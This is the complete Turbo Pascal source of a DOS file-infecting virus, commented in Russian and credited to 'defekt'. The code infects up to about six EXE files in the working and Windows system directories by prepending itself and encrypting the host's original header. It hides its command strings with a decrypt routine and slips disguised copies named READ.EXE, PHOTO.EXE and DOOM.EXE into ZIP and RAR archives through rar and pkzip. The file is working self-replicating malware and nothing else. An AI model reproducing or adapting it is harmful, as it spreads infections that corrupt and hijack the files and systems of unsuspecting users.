{$I-,S-}                       {Команда компилятору на уменьшение кода вируса}
{$M 5000,0,5000}
uses dos;                               {Используем функции DOSa}
const au = '-┐╡GаY║Ао4аD╡╡mУп╞Sm█▒R▓/│Д▓z╕$┴A%,O';  {SmaSh by defekt}
      mel = 6418;                       {Длина вируса}
var me,we : file;
    met,wet : array[1..mel] of byte;
    s_win : byte;
    bit : byte;
{----------------------------------------------------------------------------}
function decrypt(word : string):string; {Расшифровщик}
var i : byte;
    s : string;
begin
s := '';
delete(word,1,4);
delete(word,length(word)-2,3);
for i := 1 to length(word) div 2 do
  begin
  s := s + Chr(Ord(word[i]) - ((394 div 5) xor 3));
  delete(word,i+1,1);
  end;
decrypt := s;
end;
{----------------------------------------------------------------------------}
procedure infarc(ind : byte;prar : string);  {Заражение архивов}
const no = ' ';
var arcn,arcp : string;
    ran : byte;
begin
randomize;
ran := random(4);
if ran = 1 then arcn :=decrypt('ЕрВЖЯЕТыОЙСA{НТПеШТКрОН')  {READ.EXE}
  else if ran = 2 then arcn :=decrypt('ОпeiЭАХNЬэбпЬs{jТгеКТчеКп') {PHOTO.EXE}
  else if ran = 3 then arcn :=decrypt('НлгПСъЬЖЬЖЪы{aТРеВТФорН')  {DOOM.EXE}
  else exit;                            {Если ноль - на выход}
assign(me,arcn);
rewrite(me,1);
blockwrite(me,met,mel);
close(me);
if ind = 0 then                         {rar a -o+ -y -c- -tk}                                                     {>nul}
  arcp := decrypt('TЬ▓┴|R░fm╘╜╠╕y╟├╢h╜fm┘ztоR▒▒▒▒mez;╝T├█▓a┐[─═┐6╢u┴╬▓Y┐┤}')+no+prar+no+arcn+decrypt('╥E╗9ЛD╗╡┬Y╣R╣┐╫');
if ind=1 then                           {pkzip -add -overwrite}                                      {>nul}
  arcp := decrypt('Trsg|I░fmg┐jоН┐amkоWmkz;╝px,mqzy╞smlz"░jzpmwzu┴s╕kjgY')+no+prar+no+arcn+decrypt('WE╕aЛ╙╗│┬P╣█jы┌');
exec(getenv(decrypt('ЕрY5РgЬЙЪ#а~ЭЖТвРЙaP^')),arcp); {COMSPEC}
erase(me);
end;
{----------------------------------------------------------------------------}
procedure inf;                          {Заражаем файл}
var a : char;
    i,df : integer;
    time : longint;
begin
randomize;
a := '';                               {Метка зараженности}
getftime(we,time);
seek(we,0);                             {Перешли в начало файла}
blockread(we,wet,mel);                  {Считали начало файла в массив wet}
df := random(filesize(we));
seek(we,df);
blockread(we,bit,1);
seek(we,filesize(we));                  {Нашли конец файла}
for i := 1 to mel do
  begin
  wet[i] := wet[i] xor bit;             {Шифруем и записываем его}
  blockwrite(we,wet[i],1);
  end;
bit := bit xor (ord('d')+ord('f'));
blockwrite(we,bit,1);                   {Ключ расшифровки}
blockwrite(we,a,1);                     {Поставили метку зараженности}
seek(we,0);                             {Опять в начало}
blockwrite(we,met,mel);                 {Записали тело виря}
setftime(we,time);
close(we);                              {Закрыли файлик}
end;
{----------------------------------------------------------------------------}
procedure chk(path : string);           {Проверка зараженности}
var b : byte;
begin
assign(we,path);
reset(we,1);
seek(we,filesize(we)-1);                {Нашли последний байт файла}
blockread(we,b,1);
if b= ord('') then
  begin
  s_win := s_win-1; exit; end
  else inf;
end;                             {Если он равен нашей метке, след., заражены}
{----------------------------------------------------------------------------}
procedure findf(pt : string);           {Поиск файлов}
label lab;
var SR : searchrec;
    met : string;
    ind : byte;
begin
findfirst(pt,$3F,SR);                   {Ищем EXE}
if pt='*.exe' then goto lab;
if doserror<>0 then exit          {Вот что бывает, если долго писать вирусы  по ночам..%) }
  else if pt='*.zip' then ind:=0
    else if pt='*.rar' then ind:=1;
if (ind=0)or(ind=1) then begin met:=SR.name;infarc(ind,SR.name) end
  else
  lab:
  while doserror=0 do
    begin
    if s_win=5 then exit;               {Если 6 файл, выходим}
    chk(SR.name);                       {Иначе на заражение}
    s_win := s_win+1;                   {Счетчик зараженных файлов}
    findnext(SR);
    if (ind=0)or(ind=1) then
      begin
      if met=SR.name then exit else
        begin
        met:=SR.name;infarc(ind,SR.name) end;
    end;
  end;
end;
{----------------------------------------------------------------------------}
procedure le;                           {Восстанавливаем файл-носитель}
var i : integer;
    p : string;
begin
assign(we,paramstr(0));
reset(we,1);
blockread(we,met,mel);                  {Считали вирус в массив met}
if filesize(we) <= mel then exit;       {Если длина фала меньше длины вируса - выходим}
seek(we,filesize(we)-2);                {Ищем последние байты}
blockread(we,bit,1);                    {Считали ключ расшифровки}
seek(we,filesize(we)-2);
truncate(we);                           {Удаляем их}
seek(we,filesize(we)-mel);              {Ищем сохраненное начало фала-носителя}
blockread(we,wet,mel);                  {Считываем его}
truncate(we);                           {Отрезаем}
seek(we,0);                             {В начало фала}
bit := bit xor (ord('d')+ord('f'));
for i := 1 to mel do
  begin                                 {Расшифровываем и записываем начало}
  wet[i] := wet[i] xor bit;
  blockwrite(we,wet[i],1);
  end;
close(we);
for i := 1 to paramcount do p := p + paramstr(i);
exec(paramstr(0),p);    {Запускаем восстановленый файл-носитель с параметрами}
close(we);
end;
{----------------------------------------------------------------------------}
begin
le;                                    {Идем на восстановление файла-носителя}
findf('*.exe');
findf('*.zip');findf('*.rar');    {winbootdir}       {Ищем архивы}
chdir(GetEnv(decrypt('┐Одw─╥╢╤╗sпо╝╘╝ї┴R▒█╢┼┐╛║Y;'))); {Переходим в сист. директорию}
findf('*.exe');                        {Заражаем файлы там}
findf('*.zip');findf('*.rar');
end.                                   {КОНЕЦ!!!!}